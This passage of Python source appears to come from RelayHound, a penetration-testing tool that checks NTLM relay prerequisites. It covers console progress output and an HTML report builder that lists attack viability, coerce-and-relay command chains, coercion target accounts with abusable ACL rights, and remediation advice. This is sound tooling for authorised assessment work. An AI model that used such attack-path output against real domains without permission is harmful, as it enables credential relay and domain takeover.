        """Called (under the engine lock) each time a parallel module completes."""
        self._parallel_done += 1
        done, total = self._parallel_done, self._total
        if RICH_AVAILABLE:
            if self.verbose:
                # No spinner to update; print a completion note on the last module.
                if done == total:
                    self._console.print(
                        f"\n[dim]Parallel run complete — {total} modules checked.[/]",
                        highlight=False,
                    )
            elif self._spinner is not None:
                self._spinner.update(
                    text=f"[dim]Running [cyan]{total}[/] modules in parallel... "
                         f"[dim]({done}/{total} done)[/]"
                )
                if done == total:
                    self._stop_live()
                    self._console.print(
                        f"[dim]Parallel run complete — {total} modules checked.[/]",
                        highlight=False,
                    )
        else:
            if done == total:
                print(f"{total}/{total}", flush=True)

    # ── module lifecycle (sequential only) ─────────────────────────
    def module_started(self, attack_name: str, index: int, total: int) -> None:
        self._current_attack = attack_name
        self._module_prefix = f"Module {index}/{total}"
        self._idx = index
        self._total = total
        self._check_count = 0
        if self.parallel:
            return

        if not RICH_AVAILABLE:
            if self.verbose:
                print(f"\n> {self._module_prefix}: {attack_name}")
            elif not self.quiet:
                # Quiet defers the whole line to module_finished (verdict unknown
                # here, so a NOT VIABLE module can't yet be suppressed).
                print(f"[{index}/{total}] {attack_name}... ", end="", flush=True)
            return

        if self.verbose:
            self._console.print(
                f"\n[bold cyan]▶ {self._module_prefix}: {attack_name}[/]",
                highlight=False,
            )
        else:
            from rich.live import Live
            from rich.spinner import Spinner
            self._spinner = Spinner(
                "dots",
                text=f"[cyan]{self._module_prefix}:[/] {attack_name}...",
            )
            self._live = Live(self._spinner, console=self._console,
                              transient=True, refresh_per_second=12)
            self._live.start()

    def update(self, attack_name: str, check_name: str, result) -> None:
        # Parallel non-verbose: stay silent (the banner + summary table cover it).
        if self.parallel and not self.verbose:
            return

        if not RICH_AVAILABLE:
            if self.verbose:
                # In parallel there is no module_started header — print one
                # when the active attack changes so lines stay attributable.
                if self.parallel and attack_name != self._current_attack:
                    print(f"\n> {attack_name}")
                    self._current_attack = attack_name
                label = STATUS_PLAIN.get(result.status, str(result.status))
                print(f"  {label:<6} {check_name}")
            elif not self.quiet:
                # No header was printed under quiet, so a dot would be orphaned.
                print(".", end="", flush=True)
            return

        if self.verbose:
            style, label = STATUS_STYLE.get(result.status, ("dim", str(result.status)))
            # Header here only fires in parallel; sequential set it in module_started.
            if attack_name != self._current_attack:
                self._console.print(f"\n[bold cyan]▶ {attack_name}[/]")
                self._current_attack = attack_name
            self._console.print(
                f"  [{style}]{label:<8}[/] {check_name}",
                highlight=False,
            )
        else:
            # Non-verbose rich, sequential: buffer the result, just bump the
            # count shown on the spinner. Never print() here — it would corrupt
            # the live spinner line.
            self._check_count += 1
            if self._spinner is not None:
                plural = "check" if self._check_count == 1 else "checks"
                self._spinner.update(
                    text=f"[cyan]{self._module_prefix}:[/] {self._current_attack} "
                         f"[dim]({self._check_count} {plural})[/]"
                )

    def module_finished(self, attack_name: str, ar) -> None:
        if self.parallel:
            return

        suppress = self.quiet and not self.verbose and ar.viability in _HIDDEN_IN_QUIET
        vstyle, vlabel = VIABILITY_STYLE.get(ar.viability, ("dim", ar.viability))

        if not RICH_AVAILABLE:
            if self.verbose:
                print(f"  => {ar.viability}")
            elif self.quiet:
                # Header was deferred; emit the complete line, or nothing if
                # this module is being suppressed.
                if not suppress:
                    print(f"[{self._idx}/{self._total}] {attack_name}... "
                          f"{ar.viability}", flush=True)
            else:
                # Completes the "[X/Y] <name>... " line opened in module_started.
                print(ar.viability, flush=True)
            return

        if self.verbose:
            self._console.print(
                f"  [dim]{self._module_prefix} verdict:[/] [{vstyle}]{vlabel}[/]",
                highlight=False,
            )
            return

        # Non-verbose rich: stop the spinner (erased — transient). Under quiet a
        # NOT VIABLE module leaves nothing behind; otherwise print the verdict.
        self._stop_live()
        if suppress:
            return
        self._console.print(
            f"  [{vstyle}]{vlabel}[/]  [dim]·[/] {self._module_prefix}: {attack_name}",
            highlight=False,
        )

    def flush(self) -> None:
        """Tear down any live spinner left running (e.g. on early exit)."""
        self._stop_live()

    def _stop_live(self) -> None:
        if self._live is not None:
            try:
                self._live.stop()
            except Exception:
                pass
            self._live = None
            self._spinner = None


# ── HTML report ────────────────────────────────────────────────────────────

def write_html_report(
    results: list[AttackResult],
    env_summary: dict,
    output_path: str,
    relay_target_summary: RelayTargetSummary | None = None,
) -> None:
    """Write a self-contained HTML report suitable for inclusion in a pentest report."""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    recs = _build_remediation(results)

    # ── viability badge helpers ────────────────────────────────────
    def viability_badge(viability: str) -> str:
        cfg = {
            "VIABLE":     ("badge-viable",     "✅ VIABLE"),
            "PARTIAL":    ("badge-partial",    "⚠️ PARTIAL"),
            "NOT VIABLE": ("badge-not-viable", "❌ NOT VIABLE"),
            "UNKNOWN":    ("badge-unknown",    "❓ UNKNOWN"),
        }
        cls, label = cfg.get(viability, ("badge-unknown", viability))
        return f'<span class="badge {cls}">{label}</span>'

    def status_badge(status: Status) -> str:
        cfg = {
            Status.PASS:  ("status-pass",  "PASS ✓"),
            Status.FAIL:  ("status-fail",  "FAIL ✗"),
            Status.WARN:  ("status-warn",  "WARN ⚠"),
            Status.SKIP:  ("status-skip",  "SKIP –"),
            Status.ERROR: ("status-error", "ERR !"),
        }
        cls, label = cfg.get(status, ("status-skip", str(status)))
        return f'<span class="status {cls}">{label}</span>'

    def esc(s: str) -> str:
        """HTML-escape a string."""
        return (s.replace("&", "&amp;").replace("<", "&lt;")
                 .replace(">", "&gt;").replace('"', "&quot;"))

    # ── executive summary rows ─────────────────────────────────────
    summary_rows = ""
    for ar in results:
        failed = ", ".join(f"<code>{esc(m)}</code>" for m in ar.missing) or "—"
        skipped = ", ".join(f"<code>{esc(s)}</code>" for s in ar.skipped) or "—"
        summary_rows += f"""
        <tr>
            <td class="attack-name">{esc(ar.attack_name)}</td>
            <td class="center">{viability_badge(ar.viability)}</td>
            <td>{failed}</td>
            <td>{skipped}</td>
        </tr>"""

    # ── per-attack detail sections ─────────────────────────────────
    detail_sections = ""
    for ar in results:
        viability_cls = ar.viability.lower().replace(" ", "-")
        check_rows = ""
        for c in ar.checks:
            req_label = '<span class="req-label">required</span>' if c.required else '<span class="opt-label">optional</span>'
            row_cls = f"row-{STATUS_PLAIN[c.status].lower()}"
            check_rows += f"""
            <tr class="{row_cls}">
                <td>{esc(c.name)}</td>
                <td class="center">{req_label}</td>
                <td class="center">{status_badge(c.status)}</td>
                <td class="detail-cell">{esc(c.detail if isinstance(c.detail, str) else str(c.detail))}</td>
            </tr>"""

        missing_html = ""
        if ar.missing:
            items = "".join(f"<li><code>{esc(m)}</code></li>" for m in ar.missing)
            missing_html = f'<div class="missing-list"><strong>Missing prerequisites (required):</strong><ul>{items}</ul></div>'

        optional_failed_html = ""
        if ar.optional_failed:
            items = "".join(f"<li><code>{esc(m)}</code></li>" for m in ar.optional_failed)
            optional_failed_html = f'<div class="skipped-list"><strong>Failed optional checks:</strong><ul>{items}</ul></div>'

        skipped_html = ""
        if ar.skipped:
            items = "".join(f"<li><code>{esc(s)}</code></li>" for s in ar.skipped)
            skipped_html = f'<div class="skipped-list"><strong>Checks skipped:</strong><ul>{items}</ul></div>'

        detail_sections += f"""
    <div class="attack-section {viability_cls}">
        <div class="attack-header">
            <h3>{esc(ar.attack_name)}</h3>
            {viability_badge(ar.viability)}
        </div>
        {missing_html}
        {optional_failed_html}
        {skipped_html}
        <table class="checks-table">
            <thead>
                <tr>
                    <th>Check</th>
                    <th class="center">Required</th>
                    <th class="center">Status</th>
                    <th>Detail</th>
                </tr>
            </thead>
            <tbody>{check_rows}
            </tbody>
        </table>
    </div>"""

    # ── attack paths section ───────────────────────────────────────
    chains = _build_attack_chains(results, env_summary, relay_target_summary)
    attack_paths_html = ""
    if chains:
        TIER_COLOUR = {"CRITICAL": "#fc8181", "HIGH": "#f6ad55", "MEDIUM": "#63b3ed"}
        TIER_LABEL  = {"CRITICAL": "🔴 CRITICAL", "HIGH": "🟠 HIGH", "MEDIUM": "🔵 MEDIUM"}
        paths_html  = ""
        for chain in chains:
            colour     = TIER_COLOUR.get(chain.tier, "#e2e8f0")
            tier_label = TIER_LABEL.get(chain.tier, chain.tier)
            coerce_escaped = esc(chain.coerce_cmd).replace("\n", "<br>")
            relay_escaped  = esc(chain.relay_cmd or "")
            notes_html = f'<p style="font-size:12px;color:#a0aec0;margin:4px 0 0 0">↳ {esc(chain.notes)}</p>' if chain.notes else ""
            paths_html += f"""
      <div style="border-left:3px solid {colour};padding:10px 16px;margin-bottom:18px;background:#1a202c;border-radius:4px">
        <div style="margin-bottom:6px">
          <span style="color:{colour};font-weight:700;font-size:13px">{tier_label}</span>
          <span style="color:#e2e8f0;font-weight:600;font-size:14px;margin-left:10px">{esc(chain.title)}</span>
        </div>
        <p style="font-size:12px;color:#a0aec0;margin:0 0 8px 0"><strong style="color:#718096">Prerequisites:</strong> {esc(chain.prereqs)}</p>
        <pre style="background:#2d3748;padding:10px;border-radius:4px;font-size:12px;color:#68d391;overflow-x:auto;margin:0 0 6px 0"># Coerce\n{coerce_escaped}\n\n# Relay\n{relay_escaped}</pre>
        {notes_html}
      </div>"""

        attack_paths_html = f"""
  <h2>Recommended Attack Paths</h2>
  <p style="font-size:12px;color:#718096;margin-bottom:12px;">
    Prioritised chains based on viable prerequisites. Commands use real values where available.
  </p>{paths_html}"""

    # ── coercion target candidates section ────────────────────────
    relay_targets_html = ""
    if relay_target_summary is not None:
        if relay_target_summary.skipped:
            relay_targets_html = f"""
  <h2>Coercion Target Candidates</h2>
  <p style="color:#f6ad55;font-size:13px;">⚠ Skipped: {esc(relay_target_summary.skipped)}</p>"""
        elif relay_target_summary.error:
            relay_targets_html = f"""
  <h2>Coercion Target Candidates</h2>
  <p style="color:#fc8181;font-size:13px;">✗ Error: {esc(relay_target_summary.error)}</p>"""
        elif not relay_target_summary.entries:
            relay_targets_html = """
  <h2>Coercion Target Candidates</h2>
  <p style="color:#718096;font-size:13px;">No relay-worthy ACL paths found with the enumeration credential.</p>"""
        else:
            ATTACK_COLOURS = {
                "RBCD":        "#63b3ed",
                "ShadowCreds": "#d6bcfa",
                "LAPS":        "#f6ad55",
                "ACLAbuse":    "#fc8181",
            }
            relay_rows = ""
            for entry in sorted(
                relay_target_summary.entries,
                key=lambda e: (e.account, e.attack, e.target_object),
            ):
                colour = ATTACK_COLOURS.get(entry.attack, "#e2e8f0")
                relay_rows += f"""
        <tr>
            <td><code>{esc(entry.account)}</code></td>
            <td class="center"><span style="color:{colour};font-weight:600">{esc(entry.attack)}</span></td>
            <td>{esc(entry.target_object)}</td>
            <td><code>{esc(entry.right)}</code></td>
        </tr>"""

            relay_targets_html = f"""
  <h2>Coercion Target Candidates</h2>
  <p style="font-size:12px;color:#718096;margin-bottom:12px;">
    Accounts with ACL rights that make them valuable coercion targets.
    Coerce any listed account and relay its authentication to the indicated attack.
  </p>
  <div class="summary-wrapper">
    <table>
      <thead>
        <tr>
          <th>Account</th>
          <th class="center">Attack</th>
          <th>Target Object</th>
          <th>Right</th>
        </tr>
      </thead>
      <tbody>{relay_rows}
      </tbody>
    </table>
  </div>"""

    # ── remediation rows ───────────────────────────────────────────
    remediation_rows = ""
    for finding, rec in recs:
        remediation_rows += f"""
        <tr>
            <td><code>{esc(finding)}</code></td>
            <td>{esc(rec)}</td>
        </tr>"""

    # ── meta info ──────────────────────────────────────────────────
    extra_targets = ", ".join(env_summary.get("extra_targets", [])) or "—"
    domain   = esc(env_summary.get("domain", "N/A"))
    dc_ip    = esc(env_summary.get("dc_ip", "N/A"))
    user     = esc(env_summary.get("user", "N/A"))

    # Scope / ROE notes — rendered as a callout only when present.
    _scope_notes = env_summary.get("scope_notes") or []
    if _scope_notes:
        _sn_items = "".join(
            f'      <div class="scope-note-item">{esc(n)}</div>\n' for n in _scope_notes
        )
        scope_notes_html = (
            '\n  <div class="scope-notes">\n'
            '    <div class="scope-notes-title">🔍 Scope Notes</div>\n'
            f"{_sn_items}"
            "  </div>\n"
        )
    else:
        scope_notes_html = ""

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RelayHound Report — {domain}</title>
<style>
  /* ── Reset & base ── */
  *, *::before, *::after {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    font-size: 14px;
    line-height: 1.5;
    background: #0f1117;
    color: #e2e8f0;
    padding: 32px 24px;
  }}
  a {{ color: #63b3ed; }}
  code {{
    font-family: "JetBrains Mono", "Fira Code", "Cascadia Code", monospace;
    font-size: 12px;
    background: #1e2330;
    padding: 2px 6px;
    border-radius: 4px;
    color: #a8d8f0;
  }}

  /* ── Layout ── */
  .container {{ max-width: 1200px; margin: 0 auto; }}

  /* ── Scope notes (ROE / discovered-DC probing) ── */
  .scope-notes {{
    border-left: 4px solid #ecc94b;
    background: #211f16;
    padding: 12px 16px;
    border-radius: 0 8px 8px 0;
    margin-bottom: 28px;
  }}
  .scope-notes-title {{ font-weight: 600; color: #ecc94b; margin-bottom: 6px; }}
  .scope-note-item {{ color: #cbd5e0; margin: 4px 0; }}

  /* ── Header ── */
  .report-header {{
    border-left: 4px solid #4299e1;
    padding: 16px 20px;
    background: #1a1f2e;
    border-radius: 0 8px 8px 0;
    margin-bottom: 32px;
  }}
  .report-header h1 {{
    font-size: 22px;
    font-weight: 700;
    color: #90cdf4;
    margin-bottom: 12px;
  }}
  .meta-grid {{
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
    gap: 8px;
    font-size: 13px;
  }}
  .meta-item {{ color: #a0aec0; }}
  .meta-item strong {{ color: #cbd5e0; }}

  /* ── Section titles ── */
  h2 {{
    font-size: 16px;
    font-weight: 600;
    color: #90cdf4;
    margin: 36px 0 14px;
    padding-bottom: 6px;
    border-bottom: 1px solid #2d3748;
    text-transform: uppercase;
    letter-spacing: 0.05em;
  }}

  /* ── Tables ── */
  table {{
    width: 100%;
    border-collapse: collapse;
    font-size: 13px;
    margin-bottom: 8px;
  }}
  th {{
    background: #1e2330;
    color: #90cdf4;
    font-weight: 600;
    padding: 10px 12px;
    text-align: left;
    border-bottom: 1px solid #2d3748;
    white-space: nowrap;
  }}
  td {{
    padding: 9px 12px;
    border-bottom: 1px solid #1e2330;
    vertical-align: top;
  }}
  tr:last-child td {{ border-bottom: none; }}
  tr:hover td {{ background: #1a1f2e; }}
  .center {{ text-align: center; }}
  .attack-name {{ font-weight: 500; white-space: nowrap; }}
  .detail-cell {{ color: #a0aec0; font-size: 12px; }}

  /* ── Row colours by status ── */
  .row-pass td  {{ border-left: 2px solid #48bb78; }}
  .row-fail td  {{ border-left: 2px solid #fc8181; }}
  .row-warn td  {{ border-left: 2px solid #f6ad55; }}
  .row-skip td  {{ border-left: 2px solid #4a5568; opacity: 0.7; }}
  .row-error td {{ border-left: 2px solid #fc8181; }}

  /* ── Badges ── */
  .badge, .status {{
    display: inline-block;
    padding: 3px 10px;
    border-radius: 12px;
    font-size: 11px;
    font-weight: 600;
    white-space: nowrap;
    letter-spacing: 0.03em;
  }}
  .badge-viable     {{ background: #1c4532; color: #68d391; border: 1px solid #2f855a; }}
  .badge-partial    {{ background: #3d2b00; color: #f6ad55; border: 1px solid #c05621; }}
  .badge-not-viable {{ background: #3d0000; color: #fc8181; border: 1px solid #9b2c2c; }}
  .badge-unknown    {{ background: #2d3748; color: #a0aec0; border: 1px solid #4a5568; }}
  .status-pass  {{ background: #1c4532; color: #68d391; }}
  .status-fail  {{ background: #3d0000; color: #fc8181; }}
  .status-warn  {{ background: #3d2b00; color: #f6ad55; }}
  .status-skip  {{ background: #2d3748; color: #718096; }}
  .status-error {{ background: #3d0000; color: #fc8181; }}
  .req-label {{ font-size: 11px; color: #90cdf4; font-weight: 500; }}
  .opt-label {{ font-size: 11px; color: #4a5568; }}

  /* ── Attack sections ── */
  .attack-section {{
    background: #141824;
    border-radius: 8px;
    margin-bottom: 20px;
    overflow: hidden;
    border: 1px solid #2d3748;
  }}
  .attack-header {{
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 14px 18px;
    background: #1a1f2e;
    border-bottom: 1px solid #2d3748;
  }}
  .attack-header h3 {{
    font-size: 14px;
    font-weight: 600;
    color: #e2e8f0;
  }}
  /* Left border by viability */
  .viable     {{ border-left: 4px solid #48bb78; }}
  .partial    {{ border-left: 4px solid #ed8936; }}
  .not-viable {{ border-left: 4px solid #fc8181; }}
  .unknown    {{ border-left: 4px solid #4a5568; }}

  .missing-list, .skipped-list {{
    padding: 10px 18px;
    font-size: 12px;
    background: #0f1117;
    border-bottom: 1px solid #2d3748;
  }}
  .missing-list {{ color: #fc8181; }}
  .skipped-list {{ color: #718096; }}
  .missing-list ul, .skipped-list ul {{
    margin: 4px 0 0 16px;
  }}
  .checks-table td, .checks-table th {{ padding: 8px 14px; }}
  .checks-table {{ table-layout: fixed; }}
  .checks-table th:nth-child(1),
  .checks-table td:nth-child(1) {{ width: 38%; word-break: break-word; }}
  .checks-table th:nth-child(2),
  .checks-table td:nth-child(2) {{ width: 90px; text-align: center; white-space: nowrap; }}
  .checks-table th:nth-child(3),
  .checks-table td:nth-child(3) {{ width: 90px; text-align: center; white-space: nowrap; }}
  .checks-table th:nth-child(4),
  .checks-table td:nth-child(4) {{ width: auto; }}

  /* ── Summary table wrapper ── */
  .summary-wrapper {{
    background: #141824;
    border-radius: 8px;
    border: 1px solid #2d3748;
    overflow: hidden;
    margin-bottom: 8px;
  }}

  /* ── Remediation ── */
  .remediation-wrapper {{
    background: #141824;
    border-radius: 8px;
    border: 1px solid #2d3748;
    overflow: hidden;
  }}

  /* ── Footer ── */
  .footer {{
    margin-top: 40px;
    padding-top: 16px;
    border-top: 1px solid #2d3748;
    font-size: 11px;
    color: #4a5568;
    text-align: center;
  }}
</style>
</head>
<body>
<div class="container">

  <!-- Header -->
  <div class="report-header">
    <h1>🐾 RelayHound — NTLM Relay Prerequisite Report</h1>
    <div class="meta-grid">
      <div class="meta-item"><strong>Generated:</strong> {now}</div>
      <div class="meta-item"><strong>Domain:</strong> <code>{domain}</code></div>
      <div class="meta-item"><strong>DC IP:</strong> <code>{dc_ip}</code></div>
      <div class="meta-item"><strong>Credentials:</strong> <code>{user}</code></div>
      <div class="meta-item"><strong>Extra Targets:</strong> <code>{esc(extra_targets)}</code></div>
    </div>
  </div>
{scope_notes_html}
  <!-- Executive Summary -->
  <h2>Executive Summary</h2>
  <div class="summary-wrapper">
    <table>
      <thead>
        <tr>
          <th>Attack</th>
          <th class="center">Viability</th>
          <th>Failed Prerequisites</th>
          <th>Warnings / Skipped</th>
        </tr>
      </thead>
      <tbody>{summary_rows}
      </tbody>
    </table>
  </div>

  <!-- Detailed Findings -->
  <h2>Detailed Findings</h2>
  {detail_sections}

  <!-- Recommended Attack Paths -->
  {attack_paths_html}

  <!-- Coercion Target Candidates -->
  {relay_targets_html}

  <!-- Remediation -->
  <h2>Remediation Recommendations</h2>
  <div class="remediation-wrapper">
    <table>
      <thead>
        <tr>
          <th style="width:30%">Finding</th>
          <th>Recommendation</th>
        </tr>
      </thead>
      <tbody>{remediation_rows}
      </tbody>
    </table>
  </div>

  <div class="footer">
    Report generated by <strong>RelayHound</strong> — Manual verification recommended for WARN/SKIP findings.
  </div>

</div>
</body>
</html>"""

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(html)
